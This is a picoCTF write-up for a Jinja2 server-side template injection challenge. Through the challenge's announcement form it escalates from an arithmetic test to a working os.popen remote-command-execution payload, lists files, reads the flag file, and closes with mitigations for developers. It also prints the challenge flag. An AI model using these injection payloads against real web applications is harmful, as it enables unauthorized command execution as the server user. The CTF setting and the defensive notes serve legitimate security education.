>> picoCTF — SSTI1 (Server-Side Template Injection) Writeup

**Challenge:** SSTI1 — Server-Side Template Injection  

**Category:** Web — SSTI / Template Injection 

**Author:** NIGHTFURY0X01 (Arash)

**Level:** Easy

---

## Description
> I made a cool website where you can announce whatever you want! Try it out!  
> Additional details will be available after launching your challenge instance.

The application provides a simple announcement form (an input named `content`) that reflects the submitted text back to the page. I interacted with the site through the web UI (entered payloads into the form and submitted) to confirm SSTI and to escalate to command execution.

> **Warning:** The techniques below are for CTF/educational purposes only. Do not use them on systems without explicit authorization.

---

## Summary
By submitting specially crafted template expressions in the announcement form, the server evaluated Jinja2/Python expressions. Starting from a basic arithmetic test, I used introspection to access Python globals and `os.popen`, enumerated the application directory, and read the `flag` file. All interaction was done using the website form (no `curl`).

---

## Tools
- Web browser (to open the challenge page and submit the announcement form)  
- Optional: a text editor to prepare payloads before copying into the form

---

## Steps — Browser interaction (what I did)

### 1. Open the challenge page
I loaded the challenge instance in my browser and located the announcement form:

![Step 1](images/1.png)

```html
<form action="/" method="POST">
  What do you want to announce: <input name="content" id="announce">
  <button type="submit"> Ok </button>
</form>

```
![Step 2](images/2.png)

+ The form posts content to / and reflects the announcement back to the page.

### 2. Confirm SSTI with a simple arithmetic test

+ I entered the payload into the input field:

```bash
{{7*7}}
```
![Step 3](images/3.png)

+ Then I submitted the form. The page returned and showed:
```bash
49
```

![Step 4](images/4.png)

+ This confirmed the server is evaluating template expressions (SSTI).

### 3. Escalate to command execution via Python builtins

+ To import modules and run shell commands, I used Python introspection through the request object available in the template context. I entered:

```bash
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
```
![Step 5](images/5.png)

+ After submitting the form, the page reflected:

```bash
uid=0(root) gid=0(root) groups=0(root)
```

![Step 6](images/6.png)

+ This shows the process is running as root, and that os.popen() is usable to execute shell commands.


### 4. Enumerate files in the working directory

Next, I listed files by submitting:

```bash
{{request.application.__globals__.__builtins__.__import__('os').popen('ls').read()}}
```
![Step 7](images/7.png)

+ The page returned:

```bash
__pycache__
app.py
flag
requirements.txt
```

![Step 8](images/8.png)

+ This confirmed a flag file exists in the application directory.


### 5. Read the flag file

Finally, I retrieved the flag by submitting:

```bash
{{request.application.__globals__.__builtins__.__import__('os').popen('cat flag').read()}}
```

![Step 9](images/9.png)

+ The page returned the flag:
```bash
picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_09365533}
```
![Step 10](images/10.png)

## Final Flag:
```bash
picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_09365533}
```
---
## Analysis & Notes

+ The content field was rendered inside a server-side template and evaluated as a Jinja2/Python expression — classic SSTI.

+ Using request.application.__globals__.__builtins__.__import__('os') allowed importing os from within the template sandbox (when direct import is unavailable). From there os.popen() executed shell commands.

+ The server process was running as root, which made reading local files trivial. In production systems, running app processes as root is insecure.

+ Important: all actions above were performed by typing payloads into the web form and submitting — no CLI tooling was required.
---
## Mitigations (for developers)

+ To prevent SSTI and related RCE risks:

+ Do not render raw user input inside templates. Escape user-supplied content or use safe display functions.

+ Use template engine sandboxing (Jinja2 sandbox, strict environments) and avoid exposing request, application, or __builtins__ to templates.

+ Run application processes with least privilege (do not run as root).

+ Validate and sanitize inputs; treat inputs strictly as data.

+ Apply defense-in-depth: input validation, output encoding, template auto-escaping, and minimal runtime privileges.
